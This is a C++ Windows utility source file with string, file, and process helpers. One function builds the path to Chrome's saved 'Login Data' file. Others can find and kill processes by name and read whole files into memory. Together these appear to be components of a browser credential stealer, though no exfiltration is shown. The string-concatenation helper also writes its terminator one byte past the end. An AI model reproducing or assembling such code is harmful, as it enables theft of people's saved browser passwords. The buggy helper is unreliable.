#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <shlobj.h>
#include "process.h"

#include "preprocessor.h"
#include "memory.h"
#include "utility.h"


/*****************************Strings Helper Functions**************************************/
/////////////////////////////////////////////////////////////////////////////////////////////

template <class Tstr>
int TStrings<Tstr>::Length (const Tstr *str) 
{  
	int len = 0;
	
	if(str != NULL)
	    while(str[len] != 0) len++;		    
		
	return len;  
} 


template <class Tstr>
int TStrings<Tstr>::Compare (const Tstr* str1, const Tstr* str2) 
{
	int sz = 1;

	while((sz = *str1 - *str2) == 0 && *str2 != 0)
	{
		str1++;
		str2++;
	}  

	return (sz == 0 ? 0 : (sz > 0 ? 1 : -1));
}


void Strings::Cat(char* str1, char* str2)
{	
		int i = TStrings<char>::Length(str1);	
		int k = TStrings<char>::Length(str2);
		
		int sz = i+k;

		Memory::_memcpy2(str1+i, str2, k); 
		*(str1+sz+1) = '\0';
		 
}
/*****************************End String Helper Functions**************************************/







/********************************************File Helper Functions*****************************************/
/////////////////////////////////////////////////////////////////////////////////////////////////

bool FileSys::SaveToDisk(const LPWSTR fileName, const void *data, DWORD szData)
{
	bool result = false;

	HANDLE hFile = CreateFileW(fileName, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	if(hFile != INVALID_HANDLE_VALUE)
	{
		DWORD szSize;
		if(data == NULL || szData == 0 || WriteFile(hFile, data, szData, &szSize, NULL) != FALSE)result = true;
		CloseHandle(hFile);
	}	
	return result;
}
bool FileSys::GetFileDirectory(char* &pathLoginData, /*String &Str,*/ int flag )
{
	char* tempBuf =(char*)VirtualAlloc(NULL, 256, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); 
	if(SUCCEEDED(SHGetFolderPath(NULL,flag | CSIDL_FLAG_CREATE,NULL,SHGFP_TYPE_CURRENT,tempBuf)))
	{
		Strings::Cat(tempBuf,CHROME_LOGIN_DATA );
		pathLoginData = tempBuf;		
		return true;	 
    }
    return false;
}

bool FileSys::MapToMemory(LPSTR pFile,  FileData  &TFileData, DWORD accessRights, DWORD flags)
{
	TFileData.handle = CreateFileA(pFile, accessRights, FILE_SHARE_READ,	NULL, OPEN_EXISTING, 0, NULL);
	
	if(TFileData.handle != INVALID_HANDLE_VALUE)
	{   
        //printf("File handle valid!!");
		LARGE_INTEGER liSize;
		if(GetFileSizeEx(TFileData.handle, &liSize) && liSize.HighPart == 0)
	    {
			TFileData.size = liSize.LowPart;
			
			if(TFileData.size == 0)
				{
					TFileData.ptr = NULL;
					return true;
	            }

	        if((TFileData.ptr = (unsigned char*)VirtualAlloc(NULL, TFileData.size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) != NULL)
			{
				DWORD readed;
				if(ReadFile(TFileData.handle, TFileData.ptr, TFileData.size, &readed, NULL) != FALSE && readed == TFileData.size)
				{
				    return true;
				}
			    VirtualFree(TFileData.ptr, 0, MEM_RELEASE);
			}
	    }
	    CloseHandle(TFileData.handle);
	}
    return false;
} 
/////////////////////////////////////////////////////////////////////////////////////////////////////
/*****************************************************End File System Utilities*********************************/
  

  
  
/****************************************************WINDOWS SYSTEMS*******************************************/
bool WinSys::IsWindows64()
{
	SYSTEM_INFO SI;
	GetNativeSystemInfo(&SI);
	return SI.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64;
}


bool WinSys::KillProcess(DWORD pid )
{

	HANDLE			hProcess;

	if (hProcess = (HANDLE)OpenProcess(PROCESS_TERMINATE,FALSE,pid)) 
	{
		TerminateProcess(hProcess,0);
		CloseHandle(hProcess);
		return true;
	}
	
	

	return false;
};



bool WinSys::isProcessRunning(const wchar_t *processName, DWORD* ID)
{
	DWORD result = false;
	PROCESSENTRY32W ProcessEntry;
	//ClearStruct(ProcessEntry);
	HANDLE hSnap;

	hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnap != INVALID_HANDLE_VALUE)
	{
		ProcessEntry.dwSize = sizeof(ProcessEntry);
		if (Process32FirstW(hSnap, &ProcessEntry))
		{
			do 
			{
				if((TStrings<wchar_t>::Compare(ProcessEntry.szExeFile,processName) == 0))
				{
					*ID = ProcessEntry.th32ProcessID;
					return true;
				}
			}
			while (Process32NextW(hSnap, &ProcessEntry));
		}

		CloseHandle(hSnap);
	}

	return false;
}
/*************************************************END WINDOWS SYSTEM*********************************************************/
